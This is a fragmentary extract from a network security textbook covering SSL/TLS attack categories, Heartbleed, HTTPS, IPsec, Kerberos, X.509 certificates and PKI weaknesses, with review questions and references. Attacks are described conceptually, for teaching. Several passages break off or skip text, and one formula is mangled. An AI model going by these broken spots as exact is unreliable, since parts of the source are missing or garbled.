Attack Categories  We can group the attacks into four general categories:
[Word Count: 11]

• Attacks on the Handshake Protocol: As early as 1998, an approach to com-
[Word Count: 14]

promising the Handshake Protocol based on exploiting the formatting and 
implementation of the RSA encryption scheme was presented [BLEI98]. As  
countermeasures were implemented, the attack was refined and adjusted to not 
only thwart the countermeasures but also speed up the attack [e.g., BARD12].
 
• Attacks on the record and application data protocols: A number of vulner-
[Word Count: 56]

706    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

When used to recover the content of secret authentication cookies, it allows an 
attacker to perform session hijacking on an authenticated web session.
 
• Attacks on the PKI: Checking the validity of X.509 certificates is an activ-
[Word Count: 37]

ity subject to a variety of attacks, both in the context of SSL/TLS and else-
where. For example, [GEOR12] demonstrated that commonly used libraries 
for SSL/TLS suffer from vulnerable certificate validation implementations. 
The authors revealed weaknesses in the source code of OpenSSL, GnuTLS, 
JSSE, ApacheHttpClient, Weberknecht, cURL, PHP, Python, and applica-
tions build upon or with these products.
 
• Other attacks: [MEYE13] lists a number of attacks that do not fit into any of
[Word Count: 74]

the preceding categories. One example is an attack announced in 2011 by the 
German hacker group The Hackers Choice, which is a DoS attack [KUMA11]. 
The attack creates a heavy processing load on a server by overwhelming the 
target with SSL/TLS handshake requests. Boosting system load is done by es-
tablishing new connections or using renegotiation. Assuming that the majority 
of computation during a handshake is done by the server the attack creates 
more system load on the server than on the source device, leading to a DoS. 
The server is forced to continuously recompute random numbers and keys.
[Word Count: 99]

The history of attacks and countermeasures for SSL/TLS is representative of 
that for other Internet-based protocols. A “perfect” protocol and a “perfect” imple-
mentation strategy are never achieved. A constant back-and-forth between threats 
and countermeasures determines the evolution of Internet-based protocols.
[Word Count: 41]

Heartbleed  A recently discovered bug in the TLS software creates one of the 
potentially most catastrophic TLS vulnerabilities. The bug is in the open-source 
OpenSSL implementation of the Heartbeat Protocol. It is important to note that this 
vulnerability is not a design flaw in the TLS specification; rather it is a programming 
mistake in the OpenSSL library.
[Word Count: 57]

This is a spectacular flaw. The untouched memory could contain private keys, 
user identification information, authentication data, passwords, or other sensitive 
data. The flaw was not discovered for several years. Even though eventually the bug 
was fixed in all implementations, large amounts of sensitive data were exposed to
[Word Count: 48]

the Internet. Thus, we have a long exposure period, an easily implemented attack, 
and an attack that leaves no trace. Full recovery from this bug could take years. 
Compounding the problem is that OpenSSL is the most widely used TLS imple-
mentation. Servers using OpenSSL for TLS include finance, stock trading, personal 
and corporate email, social networks, banking, online shopping, and government 
agencies. It has been estimated that over two-thirds of the Internet’s Web servers 
use OpenSSL, giving some idea of the scale of the problem [GOOD14].
[Word Count: 87]

HTTPS (HTTP over SSL) refers to the combination of HTTP and SSL to implement 
secure communication between a Web browser and a Web server. The HTTPS capabil-
ity is built into all modern Web browsers. Its use depends on the Web server supporting 
HTTPS communication.
[Word Count: 45]

The principal difference seen by a user of a Web browser is that URL (uniform 
resource locator) addresses begin with https:// rather than http://. A normal HTTP 
connection uses port 80. If HTTPS is specified, port 443 is used, which invokes SSL.
[Word Count: 42]

When HTTPS is used, the following elements of the communication are 
encrypted:
[Word Count: 12]

• URL of the requested document
 
• Contents of the document
 
• Contents of browser forms (filled in by browser user)
 
• Cookies sent from browser to server and from server to browser
 
• Contents of HTTP header
[Word Count: 38]

HTTPS is documented in RFC 2818, HTTP Over TLS. There is no fundamen-
tal change in using HTTP over either SSL or TLS, and both implementations are 
referred to as HTTPS.
[Word Count: 31]

Figure 22.7  The Heartbleed Exploit
Source: “Heartbleed-The Open SSL Heartbeat Exploit” Copyright © 2014 BAE Systems 
Applied Intelligence. Reprinted with permission.
[Word Count: 21]

Extract payload &
put it into response
message
[Word Count: 8]

Malformed heartbeat:
small payload
disguised as a big
one
[Word Count: 9]

The payload is expected
to be big, so the “bucket”
gets other data too
[Word Count: 14]

* TLS private keys
• Authentication cookies
• Passwords/credentials
[Word Count: 9]

Extract payload &
put it into response
message
[Word Count: 8]

708    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

For HTTPS, the agent acting as the HTTP client also acts as the TLS client. The 
client initiates a connection to the server on the appropriate port and then sends 
the TLS ClientHello to begin the TLS handshake. When the TLS handshake has 
finished, the client may then initiate the first HTTP request. All HTTP data is to be 
sent as TLS application data. Normal HTTP behavior, including retained connec-
tions, should be followed.
[Word Count: 74]

An HTTP client or server can indicate the closing of a connection by including the 
following line in an HTTP record: Connection: close. This indicates that the 
connection will be closed after this record is delivered.
[Word Count: 36]

HTTP clients also must be able to cope with a situation in which the under-
lying TCP connection is terminated without a prior close_notify alert and 
without a Connection: close indicator. Such a situation could be due to a 
programming error on the server or a communication error that causes the TCP 
connection to drop. However, the unannounced TCP closure could be evidence 
of some sort of attack. So the HTTPS client should issue some sort of security 
warning when this occurs.
[Word Count: 82]

The Internet community has developed application-specific security mecha-
nisms in a number of areas, including electronic mail (S/MIME), client/server 
(Kerberos), Web access (SSL), and others. However, users have some security
[Word Count: 30]

concerns that cut across protocol layers. For example, an enterprise can run a 
secure, private TCP/IP network by disallowing links to untrusted sites, encrypting 
packets that leave the premises, and authenticating packets that enter the prem-
ises. By implementing security at the IP level, an organization can ensure secure 
networking not only for applications that have security mechanisms but also for 
the many security-ignorant applications.
[Word Count: 65]

In response to these issues, the Internet Architecture Board (IAB) included 
authentication and encryption as necessary security features in the next-generation 
IP, which has been issued as IPv6. Fortunately, these security capabilities were 
designed to be usable both with the current IPv4 and the future IPv6. This means 
that vendors can begin offering these features now, and many vendors do now have 
some IPsec capability in their products.
[Word Count: 68]

We begin this section with an overview of IP security (IPsec) and an intro-
duction to the IPsec architecture. We then look at some of the technical details. 
Appendix F reviews Internet protocols.
[Word Count: 33]

Applications of IPsec  IPsec provides the capability to secure communications 
across a LAN, across private and public WANs, and across the Internet. Examples 
of its use include the following:
[Word Count: 29]

• Secure branch office connectivity over the Internet: A company can build a
[Word Count: 13]

secure virtual private network over the Internet or over a public WAN. This 
enables a business to rely heavily on the Internet and reduce its need for pri-
vate networks, saving costs and network management overhead.
 
• Secure remote access over the Internet: An end user whose system is equipped
[Word Count: 50]

with IP security protocols can make a local call to an Internet service provider 
and gain secure access to a company network. This reduces the cost of toll 
charges for traveling employees and telecommuters.
[Word Count: 34]

• Establishing extranet and intranet connectivity with partners: IPsec can be
[Word Count: 11]

used to secure communication with other organizations, ensuring authentica-
tion and confidentiality and providing a key exchange mechanism.
 
• Enhancing electronic commerce security: Even though some Web and
[Word Count: 28]

­electronic commerce applications have built-in security protocols, the use of 
IPsec enhances that security.
[Word Count: 14]

The principal feature of IPsec that enables it to support these varied applica-
tions is that it can encrypt and/or authenticate all traffic at the IP level. Thus, all
[Word Count: 29]

710    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

distributed applications, including remote logon, client/server, e-mail, file transfer, 
Web access, and so on, can be secured. Figure 9.4 is a typical scenario of IPsec usage.
[Word Count: 26]

Benefits of IPsec  The benefits of IPsec include the following:
[Word Count: 10]

• When IPsec is implemented in a firewall or router, it provides strong security
[Word Count: 14]

that can be applied to all traffic crossing the perimeter. Traffic within a com-
pany or workgroup does not incur the overhead of security-related processing.
 
• IPsec in a firewall is resistant to bypass if all traffic from the outside must use
[Word Count: 42]

IP and the firewall is the only means of entrance from the Internet into the 
organization.
 
• IPsec is below the transport layer (TCP, UDP) and so is transparent to appli-
[Word Count: 31]

cations. There is no need to change software on a user or server system when 
IPsec is implemented in the firewall or router. Even if IPsec is implemented in 
end systems, upper-layer software, including applications, is not affected.
 
• IPsec can be transparent to end users. There is no need to train users on secu-
[Word Count: 55]

rity mechanisms, issue keying material on a per-user basis, or revoke keying 
material when users leave the organization.
 
• IPsec can provide security for individual users if needed. This is useful for
[Word Count: 32]

­off-site workers and for setting up a secure virtual subnetwork within an 
­organization for sensitive applications.
[Word Count: 16]

Routing Applications  In addition to supporting end users and protecting 
premises systems and networks, IPsec can play a vital role in the routing architecture 
required for internetworking. [HUIT98] lists the following examples of the use of 
IPsec. IPsec can assure that:
[Word Count: 41]

• A router advertisement (a new router advertises its presence) comes from an
[Word Count: 13]

authorized router.
 
• A neighbor advertisement (a router seeks to establish or maintain a ­neighbor
[Word Count: 15]

relationship with a router in another routing domain) comes from an 
­authorized router.
 
• A redirect message comes from the router to which the initial packet was sent.
 
• A routing update is not forged.
[Word Count: 35]

Without such security measures, an opponent can disrupt communications or 
divert some traffic. Routing protocols such as Open Shortest Path First (OSPF) should 
be run on top of security associations between routers that are defined by IPsec.
[Word Count: 37]

IPsec provides two main functions: a combined authentication/encryption func-
tion called Encapsulating Security Payload (ESP) and a key exchange function. For 
­virtual private networks, both authentication and encryption are generally desired, 
because it is important both to (1) assure that unauthorized users do not penetrate 
the virtual private network and (2) assure that eavesdroppers on the Internet can-
not read messages sent over the virtual private network. There is also an authenti-
cation-only function, implemented using an Authentication Header (AH). Because
[Word Count: 81]

­message authentication is provided by ESP, the use of AH is deprecated. It is 
included in IPsecv3 for backward compatibility but should not be used in new appli-
cations. We do not discuss AH in this chapter.
[Word Count: 37]

The key exchange function allows for manual exchange of keys as well as an 
automated scheme.
[Word Count: 16]

The IPsec specification is quite complex and covers numerous documents. 
The most important of these are RFCs 2401, 4302, 4303, and 4306. In this section, 
we provide an overview of some of the most important elements of IPsec.
[Word Count: 38]

A key concept that appears in both the authentication and confidentiality mecha-
nisms for IP is the security association (SA). An association is a one-way relationship 
between a sender and a receiver that affords security services to the traffic carried on 
it. If a peer relationship is needed, for two-way secure exchange, then two security 
associations are required. Security services are afforded to an SA for the use of ESP.
[Word Count: 70]

An SA is uniquely identified by three parameters:
[Word Count: 8]

• Security parameter index (SPI): A bit string assigned to this SA and having
[Word Count: 14]

­local significance only. The SPI is carried in an ESP header to enable the receiv-
ing system to select the SA under which a received packet will be processed.
 
• IP destination address: This is the address of the destination endpoint of the SA,
[Word Count: 44]

which may be an end-user system or a network system such as a firewall or router.
 
• Protocol identifier: This field in the outer IP header indicates whether the
[Word Count: 29]

­association is an AH or ESP security association.
[Word Count: 8]

Hence, in any IP packet, the security association is uniquely identified by the 
Destination Address in the IPv4 or IPv6 header and the SPI in the enclosed exten-
sion header (AH or ESP).
[Word Count: 33]

An IPsec implementation includes a security association database that defines 
the parameters associated with each SA. An SA is characterized by the following 
parameters:
[Word Count: 24]

• Sequence number counter: A 32-bit value used to generate the Sequence
[Word Count: 12]

Number field in AH or ESP headers.
 
• Sequence counter overflow: A flag indicating whether overflow of the
[Word Count: 18]

sequence number counter should generate an auditable event and prevent fur-
ther transmission of packets on this SA.
 
• Antireplay window: Used to determine whether an inbound AH or ESP
[Word Count: 30]

packet is a replay, by defining a sliding window within which the sequence 
number must fall.
 
• AH information: Authentication algorithm, keys, key lifetimes, and related
[Word Count: 26]

parameters being used with AH.
 
• ESP information: Encryption and authentication algorithm, keys, initializa-
[Word Count: 14]

tion values, key lifetimes, and related parameters being used with ESP.
 
• Lifetime of this security association: A time interval or byte count after which
[Word Count: 25]

an SA must be replaced with a new SA (and new SPI) or terminated, plus an 
indication of which of these actions should occur.
[Word Count: 24]

712    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

• IPsec protocol mode: Tunnel, transport, or wildcard (required for all imple-
[Word Count: 12]

mentations). These modes are discussed later in this section.
 
• Path MTU: Any observed path maximum transmission unit (maximum size of
[Word Count: 21]

a packet that can be transmitted without fragmentation) and aging variables 
(required for all implementations).
[Word Count: 15]

The key management mechanism that is used to distribute keys is coupled to 
the authentication and privacy mechanisms only by way of the security parameters 
index. Hence, authentication and privacy have been specified independent of any 
specific key management mechanism.
[Word Count: 40]

The Encapsulating Security Payload provides confidentiality services, including 
confidentiality of message contents and limited traffic flow confidentiality. As an 
optional feature, ESP can also provide an authentication service.
[Word Count: 28]

Figure 22.8 shows the format of an ESP packet. It contains the following 
fields:
[Word Count: 14]

• Security Parameters Index (32 bits): Identifies a security association.
 
• Sequence Number (32 bits): A monotonically increasing counter value.
 
• Payload Data (variable): This is a transport-level segment (transport mode)
[Word Count: 31]

or IP packet (tunnel mode) that is protected by encryption.
 
• Padding (0–255 bytes): May be required if the encryption algorithm requires
[Word Count: 22]

the plaintext to be a multiple of some number of octets.
 
• Pad Length (8 bits): Indicates the number of pad bytes immediately preceding
[Word Count: 24]

• Next Header (8 bits): Identifies the type of data contained in the Payload Data
[Word Count: 15]

field by identifying the first header in that payload (e.g., an extension header 
in IPv6, or an upper-layer protocol such as TCP).
 
• Integrity Check Value (variable): A variable-length field (must be an inte-
[Word Count: 34]

gral number of 32-bit words) that contains the integrity check value computed 
over the ESP packet minus the Authentication Data field.
[Word Count: 21]

ESP supports two modes of use: transport and tunnel modes. We begin this section 
with a brief overview.
[Word Count: 18]

ESP in transport mode encrypts and optionally authenticates the IP payload 
but not the IP header.
[Word Count: 16]

714    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

header. At B’s firewall, the outer IP header is stripped off, and the inner packet is 
delivered to B.
[Word Count: 19]

ESP in tunnel mode encrypts and optionally authenticates the entire inner IP 
packet, including the inner IP header.
[Word Count: 18]

The topics in this chapter are covered in greater detail in [STAL14a]. [LEIB07] 
provides an overview of DKIM. [POLK13] analyzes the security requirements for 
secure implementation of TLS. [SARK13] and [MEYE13] are useful surveys of 
recent attacks on SSL/TLS and approaches to mitigation. [CHEN98] provides a 
good discussion of an IPsec design.
[Word Count: 52]

22.7 Key Terms, Review Questions, and Problems
[Word Count: 7]

domain (ADMD)
Domain Name System (DNS)
DomainKeys Identified Mail
[Word Count: 9]

HTTPS (HTTP over SSL)
IPsec
IPv4
IPv6
Multipurpose Internet Mail
[Word Count: 10]

Secure Sockets Layer (SSL)
S/MIME
Transport Layer Security
[Word Count: 8]

CHEN98	 Cheng, P., et al. “A Security Architecture for the Internet Protocol.” IBM
[Word Count: 13]

Systems Journal, Number 1, 1998.
LEIB07	
Leiba, B., and Fenton, J. “DomainKeys Identified Mail (DKIM): Using 
Digital Signatures for Domain Verification.” Proceedings of Fourth 
Conference on E-mail and Anti-Spam (CEAS 07), 2007.
MEYE13	 Meyer, C.; Schwenk, J.; and Gortz, H. “Lessons Learned From Previous SSL/
[Word Count: 45]

TLS Attacks A Brief Chronology Of Attacks And Weaknesses.” Cryptology 
ePrint Archive, 2013. http://eprint.iacr.org/2013/
POLK13	
Polk, T.; Chokhani, S.; and McKay, K. Guidelines for the Selection, 
Configuration, and Use of Transport Layer Security (TLS) Implementation. 
NIST Special Publication 800-52 (Draft), September 2013.
SARK13	
Sarkar, P., and Fitzgerald, S. “Attacks on SSL: A Comprehensive Study of 
BEAST, CRIME, TIME, BREACH, LUCKY13, & RC4 Biases.” iSECpart-
ners white paper, August 15, 2013. https://www.isecpartners.com/research/
white-papers.aspx
STAL14a	 Stallings, W. Cryptography and Network Security: Principles and Practice,
[Word Count: 82]

Sixth Edition. Upper Saddle River, NJ: Pearson, 2014.
[Word Count: 8]

22.7 / Key Terms, Review Questions, and Problems   715
[Word Count: 9]

22.1	
List four functions supported by S/MIME.
	 22.2	
What is radix-64 conversion?
	 22.3	
Why is radix-64 conversion useful for an e-mail application?
	 22.4	
What is DKIM?
	 22.5	
What protocols comprise SSL?
	 22.6	
What is the difference between and SSL connection and an SSL session?
	 22.7	
What services are provided by the SSL Record Protocol?
	 22.8	
What is the purpose of HTTPS?
	 22.9	
What services are provided by IPsec?
	22.10	
What is an IPsec security association?
	22.11	
What are two ways of providing authentication in IPsec?
[Word Count: 85]

22.1	
In SSL and TLS, why is there a separate Change Cipher Spec Protocol rather than 
including a change_cipher_spec message in the Handshake Protocol?
	 22.2	
Consider the following threats to Web security and describe how each is countered by 
a particular feature of SSL.
a.	 Man-in-the-middle attack: An attacker interposes during key exchange, acting as
[Word Count: 55]

the client to the server and as the server to the client.
b.	 Password sniffing: Passwords in HTTP or other application traffic are eaves-
[Word Count: 24]

dropped.
c.	 IP spoofing: Uses forged IP addresses to fool a host into accepting bogus data.
d.	 IP hijacking: An active, authenticated connection between two hosts is disrupted
[Word Count: 28]

and the attacker takes the place of one of the hosts.
e.	 SYN flooding: An attacker sends TCP SYN messages to request a connection
[Word Count: 24]

716    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

apply. Any character is represented by an equal sign followed by a two-digit 
­hexadecimal representation of the octet’s value. For example, the ASCII form 
feed, which has an 8-bit value of decimal 12, is represented by “=0C”.
2.	 Literal representation: Any character in the range decimal 33 (“!”) through
[Word Count: 49]

­decimal 126 (“∼”), except decimal 61 (“=”), is represented as that ASCII ­character. 
The  remaining rules deal with spaces and line feeds. Explain the ­differences 
­between the intended use for the quoted-printable and base 64 ­encodings.
[Word Count: 36]

Unmarked if valid
packet not yet received
[Word Count: 7]

The Kerberos Protocol
Kerberos Realms and Multiple Kerberi
Version 4 and Version 5
Performance Issues
[Word Count: 15]

23.5	 Key Terms, Review Questions, and Problems
[Word Count: 7]

718    Chapter 23 / Internet Authentication Applications
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Summarize the basic operation of Kerberos.
◆	Compare the functionality of Kerberos version 4 and version 5.
◆	Understand the format and function of X.509 certificates.
◆	Explain the public-key infrastructure concept.
[Word Count: 33]

This chapter examines some of the authentication functions that have been 
­developed to support network-based authentication and digital signatures.
[Word Count: 19]

We begin by looking at one of the earliest and also one of the most widely 
used services: Kerberos. Next, we examine the X.509 public-key certificates. Then, 
we examine the concept of a public-key infrastructure (PKI).
[Word Count: 36]

Another way to tackle the problem is the use of authentication software tied 
to a secure authentication server. This is the approach taken by Kerberos. Kerberos, 
initially developed at MIT, is a software utility available both in the public domain 
and in commercially supported versions. Kerberos has been issued as an Internet 
standard and is the defacto standard for remote authentication.
[Word Count: 61]

The overall scheme of Kerberos is that of a trusted third-party authentication 
service. It is trusted in the sense that clients and servers trust Kerberos to mediate 
their mutual authentication. In essence, Kerberos requires that a user prove his or 
her identity for each service invoked and, optionally, requires servers to prove their 
identity to clients.
[Word Count: 56]

Kerberos makes use of a protocol that involves clients, application servers, and 
a Kerberos server. That the protocol is complex reflects that fact that there are 
many ways for an opponent to penetrate security. Kerberos is designed to counter a 
­variety of threats to the security of a client/server dialogue.
[Word Count: 50]

The basic idea is simple. In an unprotected network environment, any client 
can apply to any server for service. The obvious security risk is that of impersonation.
[Word Count: 27]

The trick is how to do all this in a secure way. It simply will not do to have 
the client send the user’s password to the AS over the network: An opponent could 
observe the password on the network and later reuse it. It also will not do for Ker-
beros to send a plain message to a server validating a client: An opponent could 
impersonate the AS and send a false validation.
[Word Count: 74]

The way around this problem is to use encryption and a set of messages that 
accomplish the task (Figure 23.1). In the case of Kerberos, the Data Encryption 
Standard (DES) is the encryption algorithm that is used.
[Word Count: 37]

1. User logs on to
workstation and
requests service on host
[Word Count: 11]

3. Workstation prompts
user for password to decrypt
incoming message, then
send ticket and
authentictor that contains
user’s name, network
address and time to TGS.
[Word Count: 25]

4. TGS decrypts ticket and
authenticator, veriﬁes request
then creates ticket for requested
application server
[Word Count: 15]

5. Workstation sends
ticket and authenticator
to host.
[Word Count: 8]

6. Host veriﬁes that
ticket and authenticator
match, then grants access
to service. If mutual
authentication is
required, server returns
an authenticator.
[Word Count: 22]

2. AS veriﬁes user's access right in
database, creates ticket-granting ticket
and session key. Results are encrypted
using key derived from user's password.
[Word Count: 23]

720    Chapter 23 / Internet Authentication Applications
[Word Count: 7]

Notice what has happened. The AS has been able to verify the user’s ­identity 
since this user knows the correct password, but it has been done in such a way that 
the password is never passed over the network. In addition, the AS has passed 
­information to the client that will be used later on to apply to a server for service, 
and that information is secure since it is encrypted with the user’s password.
[Word Count: 75]

The ticket constitutes a set of credentials that can be used by the client to 
apply for service. The ticket indicates that the AS has accepted this client and its 
user. The ticket contains the user’s ID, the server’s ID, a timestamp, a lifetime after 
which the ticket is invalid, and a copy of the same session key sent in the outer 
­message to the client. The entire ticket is encrypted using a secret DES key shared 
by the AS and the server. Thus, no one can tamper with the ticket.
[Word Count: 91]

The next two steps in the protocol repeat the last two. The TGS sends a service-
granting ticket and a new session key to the client. The entire message is encrypted 
with the old session key, so that only the client can recover the message. The ticket is 
encrypted with a secret key shared only by the TGS and server V. The client now has 
a reusable service-granting ticket for V.
[Word Count: 71]

Each time user X wishes to use service V, the client can then send this ticket plus 
an authenticator to server V. The authenticator is encrypted with the new session key.
[Word Count: 31]

722    Chapter 23 / Internet Authentication Applications
[Word Count: 7]

If mutual authentication is required, the server can reply with the value of the 
timestamp from the authenticator, incremented by 1, and encrypted in the session 
key. The client can decrypt this message to recover the incremented timestamp. 
Because the message was encrypted by the session key, the client is assured that it 
could have been created only by V. The contents of the message assures C that this 
is not a replay of an old reply.
[Word Count: 77]

Finally, at the conclusion of this process, the client and server share a secret 
key. This key can be used to encrypt future messages between the two or to exchange 
a new session key for that purpose.
[Word Count: 37]

A full-service Kerberos environment consisting of a Kerberos server, a number of 
clients, and a number of application servers, requires the following:
[Word Count: 22]

1.	 The Kerberos server must have the user ID and password of all participating
[Word Count: 14]

users in its database. All users are registered with the Kerberos server.
	
2.	 The Kerberos server must share a secret key with each server. All servers are
[Word Count: 27]

Such an environment is referred to as a realm. Networks of clients and servers 
under different administrative organizations generally constitute different realms 
(Figure 23.2). That is, it generally is not practical, or does not conform to admin-
istrative policy, to have users and servers in one administrative domain registered 
with a Kerberos server elsewhere. However, users in one realm may need access to 
servers in other realms, and some servers may be willing to provide service to users 
from other realms, provided that those users are authenticated.
[Word Count: 87]

Kerberos provides a mechanism for supporting such interrealm authentication. 
For two realms to support interrealm authentication, the Kerberos server in each 
interoperating realm shares a secret key with the server in the other realm. The two 
Kerberos servers are registered with each other.
[Word Count: 43]

The scheme requires that the Kerberos server in one realm trust the Kerberos 
server in the other realm to authenticate its users. Furthermore, the participating 
servers in the second realm must also be willing to trust the Kerberos server in the 
first realm.
[Word Count: 43]

With these ground rules in place, we can describe the mechanism as follows 
(Figure 23.2): A user wishing service on a server in another realm needs a ticket for 
that server. The user’s client follows the usual procedures to gain access to the local 
TGS and then requests a ticket-granting ticket for a remote TGS (TGS in another 
realm). The client can then apply to the remote TGS for a service-granting ticket for 
the desired server in the realm of the remote TGS.
[Word Count: 83]

The ticket presented to the remote server indicates the realm in which the 
user was originally authenticated. The server chooses whether to honor the remote 
request.
[Word Count: 26]

One problem presented by the foregoing approach is that it does not scale 
well to many realms. If there are N realms, then there must be N(N –)/2 secure 
key exchanges so that each realm can interoperate with all other Kerberos 
realms.
[Word Count: 42]

The most widely used version of Kerberos is version 4, which has been around for 
several years. More recently, a version 5 has been introduced. The most important 
improvements found in version 5 are the following. First, in version 5, an encrypted 
message is tagged with an encryption algorithm identifier. This enables users to 
configure Kerberos to use an algorithm other than DES. Recently, there has been 
some concern about the strength of DES, and version 5 gives the user the option of 
another algorithm.
[Word Count: 85]

Version 5 also supports a technique known as authentication forwarding. 
Version 4 does not allow credentials issued to one client to be forwarded to some 
other host and used by some other client. This capability would enable a client to 
access a server and have that server access another server on behalf of the client.
[Word Count: 55]

Figure 23.2  Request for Service in Another Realm
[Word Count: 8]

724    Chapter 23 / Internet Authentication Applications
[Word Count: 7]

For example, a client issues a request to a print server that then accesses the client’s 
file from a file server, using the client’s credentials for access. Version 5 provides 
this capability.
[Word Count: 32]

Finally, version 5 supports a method for interrealm authentication that 
requires fewer secure key exchanges than in version 4.
[Word Count: 19]

As client/server applications become more popular, larger and larger client/server 
installations are appearing. A case can be made that the larger the scale of the 
­networking environment, the more important it is to have logon authentication. But 
the question arises: What impact does Kerberos have on performance in a large-
scale environment?
[Word Count: 52]

Fortunately, the answer is that there is very little performance impact if the 
system is properly configured. Keep in mind that tickets are reusable. Therefore, 
the amount of traffic needed for the granting ticket requests is modest. With respect 
to the transfer of a ticket for logon authentication, the logon exchange must take 
place anyway, so again the extra overhead is modest.
[Word Count: 62]

A related issue is whether the Kerberos server application requires a ­dedicated 
platform or can share a computer with other applications. It probably is not wise to 
run the Kerberos server on the same machine as a resource-intensive application 
such as a database server. Moreover, the security of Kerberos is best assured by 
placing the Kerberos server on a separate, isolated machine.
[Word Count: 62]

Finally, in a large system, is it necessary to go to multiple realms in order to 
maintain performance? Probably not. Rather, the motivation for multiple realms 
is administrative. If you have geographically separate clusters of machines, each 
with its own network administrator, then one realm per administrator may be 
­convenient. However, this is not always the case.
[Word Count: 57]

The X.509 ITU-T standard, also specified in RFC 5280, is the most widely 
accepted format for public-key certificates. X.509 certificates are used in most network 
security applications, including IP security (IPSEC), secure sockets layer (SSL), secure 
electronic transactions (SET), and S/MIME, as well as in eBusiness applications.
[Word Count: 47]

An X.509 certificate includes the elements shown in Figure 23.3a. Key ele-
ments include the key owning Subject’s X.500 name and public-key information,
[Word Count: 23]

the Period of validity dates, the CA’s Issuer name, and their Signature that binds all 
this information together. Current X.509 certificates use the version 3 format that 
includes a general extension mechanism to provide more flexibility and to convey 
information needed in special circumstances. See [STAL14a] for further informa-
tion on the X.509 certificate format and elements.
[Word Count: 57]

The CA and “end user” certificates discussed above are the most common 
form of X.509 certificates. However, a number of specialized variants also exist, 
distinguished by particular element values or the presence of certain extensions. 
Variants include:
[Word Count: 37]

• Conventional (long-lived) certificates:  are the CA and “end user” certificates
[Word Count: 11]

discussed above. They are typically issued for validity periods of months to 
years.
[Word Count: 13]

Algorithms
Parameters
Encrypted hash
Signature
[Word Count: 5]

726    Chapter 23 / Internet Authentication Applications
[Word Count: 7]

• Short-lived certificates:  are used to provide authentication for applications
[Word Count: 10]

such as grid computing, while avoiding some of the overheads and limitations 
of conventional certificates [HSU98]. They have validity periods of hours to 
days, which limits the period of misuse if compromised. Because they are usu-
ally not issued by recognized CA’s, there are issues with verifying them out-
side their issuing organization.
 
• Proxy certificates:  are now widely used to provide authentication for appli-
[Word Count: 65]

to link a user’s identity to a set of attributes that are typically used for authori-
zation and access control. A user may have a number of different ­attribute 
certificates, with different sets of attributes for different purposes, associ-
ated with their main conventional certificate. These attributes are defined 
in an “Attributes” extension. These extensions could also be included in a 
­conventional certificate, but this is discouraged as being too inflexible. They 
may also be included in a proxy certificate, further restricting its use, and this 
is appropriate for some applications.
[Word Count: 91]

Before using any certificate, an application must check its validity, and ensure 
that it was not revoked before it expires. This may occur if the user wishes to cancel 
a key because it has been compromised, or because an upgrade in the user’s soft-
ware requires the generation of a new key.
[Word Count: 52]

A more practical alternative is to use the Online Certificate Status Protocol 
(OCSP) to query the CA as to whether a specific certificate is valid. This lightweight 
protocol is defined in RFC 6960, and is increasingly used, including in recent ver-
sions of most common web browsers. The “Authority Information Access” exten-
sion in a certificate can specify the address of the OCSP server to use, if the signing 
CA supports this protocol.
[Word Count: 73]

RFC 4949 (Internet Security Glossary) defines public-key infrastructure (PKI) as 
the set of hardware, software, people, policies, and procedures needed to create, 
manage, store, distribute, and revoke digital certificates based on asymmetric cryp-
tography. The principal objective for developing a PKI is to enable secure, conve-
nient, and efficient acquisition of public keys.
[Word Count: 53]

There are many problems with this model of a PKI, and these have been 
known for many years [GUTM02], [GRUS13]. Current implementations suffer 
from a number of critical issues. The first is the reliance on the user to make an 
informed decision when there is a problem verifying a certificate. Unfortunately, it 
is clear that most users do not understand what a certificate is and why there might 
be a problem. Hence they choose to accept a certificate, or not, for reasons that have 
little to do with their security, which may result in the compromise of their systems.
[Word Count: 99]

Another critical problem is the assumption that all of the CAs in the “trust 
store” are equally trusted, equally well managed, and apply equivalent policies. 
This was dramatically illustrated by the compromise of the DigiNotar CA in 2011 
that resulted in the fraudulent issue of certificates for many well-known organiza-
tions. It is widely believed these were used by the Iranian government to mount a 
“man-the-middle” attack on the secured communications of many of their citizens.
[Word Count: 76]

728    Chapter 23 / Internet Authentication Applications
[Word Count: 7]

As a consequence, the DigiNotar CA keys were removed from the “trust store” in 
many systems, and the company was declared bankrupt later that year. Another 
CA, Comodo, was also compromised in 2011, with a small number of fraudulent 
certificates issued.
[Word Count: 41]

A further concern is that different implementations, in the various web brows-
ers and operating systems, use different “trust stores,” and hence present different 
security views to users.
[Word Count: 28]

The first of these, confirming continuity in time, can be provided by user’s 
applications keeping a record of certificate details for all sites they visit, and check-
ing against these on subsequent visits. Certificate pinning in applications can pro-
vide this feature, as is used in Google Chrome. The Firefox “Certificate Patrol” 
extension is another example of this approach.
[Word Count: 59]

The second, confirming continuity in space, requires the use of a number of 
widely separated “network notary servers” that keep records of certificates for all 
sites they view, that can be compared with a certificate provided to the user in any 
instance. The “Perspectives Project” is a practical implementation of this approach, 
which may be accessed using the Firefox “Perspectives” plugin. This also verifies 
the time history of certificates in use, thus providing both desired features for this 
approach. The “Google Certificate Catalog” and “Google Certificate Transpar-
ency” project are other examples of such notary servers.
[Word Count: 96]

In either of the above cases, identification of a different certificate and key 
to that seen at other times or places may well be an indication of attack or other 
problems. It may also simply be the result of certificates being updated as they 
approach expiry, or of organizations incorrectly using multiple certificates and keys 
for the same, but replicated, server. These latter issues need to be managed by such 
extensions.
[Word Count: 71]

The Internet Engineering Task Force (IETF) Public Key Infrastructure X.509 
(PKIX) working group has been the driving force behind setting up a formal (and 
generic) model based on X.509 that is suitable for deploying a certificate-based 
architecture on the Internet. This section briefly describes the PKIX model. For 
more detail, see [STAL14a].
[Word Count: 52]

Figure 23.4 shows the interrelationship among the key elements of the PKIX 
model. These elements include the End entity (e.g., user or server) that the certifi­
cate is for and the Certificate authority that issues the certificates. The CA’s manage-
ment functions may be further divided to include the Registration authority (RA)
[Word Count: 52]

that handles end entity registration and the CRL issuer and Repository that 
man­age CRLs.
[Word Count: 14]

PKIX identifies a number of management functions that potentially need to 
be supported by management protocols. These are indicated in Figure 23.4 and 
include user Registration, Initialization of key material, Certification in which a CA 
issues a certificate, Key pair recovery and update, Revocation request for a certifi-
cate, and Cross certification between CAs.
[Word Count: 54]

